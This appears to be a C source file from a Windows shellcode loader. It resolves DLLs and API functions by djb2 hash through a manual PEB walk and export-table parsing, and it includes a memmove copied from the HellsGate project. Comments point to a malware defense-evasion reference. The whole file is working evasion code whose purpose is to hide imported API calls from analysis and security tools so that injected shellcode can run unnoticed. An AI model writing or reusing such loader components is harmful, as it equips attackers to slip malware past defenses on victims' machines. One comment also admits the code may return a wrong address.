#include <Windows.h>
// DEBUG_PRINT
#include "ShellCodeLoader.h"

// https://theartincode.stanis.me/008-djb2/
DWORD runtime_hash(unsigned char* str)
{
    DWORD hash = 5381;
    int c;

    while (c = *str++)
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

    return hash;
}

// Get a handle to a loaded DLL (by Hash)
// https://revers.engineering/custom-getprocaddress-and-getmodulehandle-implementation-x64/
HMODULE GetModuleHandleByHash(DWORD module_hash) {
    
    HMODULE module_base = NULL;
    //PPEB pPEB = getPEB();
    PPEB pPEB = (PPEB)(__readgsqword(0x60));
    //DEBUG_PRINT("PEB at %p\n", pPEB);
    PPEB_LDR_DATA pLDR = pPEB->Ldr;
    PLIST_ENTRY pModuleList = &(pLDR->InMemoryOrderModuleList);

    // https://learn.microsoft.com/de-de/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l?view=msvc-170
    PMY_LDR_DATA_TABLE_ENTRY currentModule = NULL;
    PLIST_ENTRY currentEntry = pModuleList->Flink;
    PLIST_ENTRY firstEntry = pModuleList;
    CHAR cstr_module_name[256] = { 0 };
    // in a double linked list, the last entry points to the first one
    while (currentEntry->Flink != firstEntry)
    {
        currentModule = (PMY_LDR_DATA_TABLE_ENTRY)currentEntry;
        // https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l?view=msvc-170
        wcstombs_s(NULL, cstr_module_name, sizeof(cstr_module_name), currentModule->FullDllName.Buffer, currentModule->FullDllName.Length - 1);
        DEBUG_PRINT("Found DLL %s. Base:%p\n", cstr_module_name, currentModule->InInitializationOrderLinks.Flink);

        if (module_hash == runtime_hash(cstr_module_name)) {
            DEBUG_PRINT("Found DLL %s for hash 0x%x. Base: %p\n", cstr_module_name, module_hash, (HMODULE)currentModule->InInitializationOrderLinks.Flink);
            // Actually this should work, but it does return a wrong address?!
            //return (HMODULE)currentModule->DllBase;
            return (HMODULE)currentModule->InInitializationOrderLinks.Flink;
        }

        //wprintf(L"Module: %s\n", currentModule->FullDllName.Buffer);
        
        currentEntry = currentEntry->Flink;
        
    }
    return NULL;
}

// Resolve API function by function hash. Generate the API hashes using create_api_hashes.py
// https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
// TODO: Create a compiletime_hash Macro to generate the functions dynamically during build
LPVOID GetProcAddressByHash(HMODULE hModule, DWORD function_hash) {
    LPVOID proc = NULL;
    // Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + dosHeader->e_lfanew);

    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + exportDirectoryRVA);

    // Get RVAs to exported function related information
    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfNameOrdinals);

    // Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
    // If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
    for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
    {
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)hModule + functionNameRVA;
        char* functionName = (char*)functionNameVA;
        DWORD_PTR functionAddressRVA = 0;

        // Calculate hash for this exported function
        DWORD functionNameHash = runtime_hash(functionName);

        // If hash for CreateThread is found, resolve the function address
        if (functionNameHash == function_hash)
        {
            functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
            proc = (PDWORD)((DWORD_PTR)hModule + functionAddressRVA);
            DEBUG_PRINT("FuncName: %s - FuncHash: 0x%x - Ptr: %p\n", functionName, functionNameHash, proc);
            return proc;
        }
    }
    // fail
    if (proc == NULL) {
        DEBUG_PRINT("Failed to resolve function for hash 0x%x!\n", function_hash);
    }
    return proc;
}


// stolen from: https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L198C1-L211C2
PVOID MoveMemoryReImpl(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}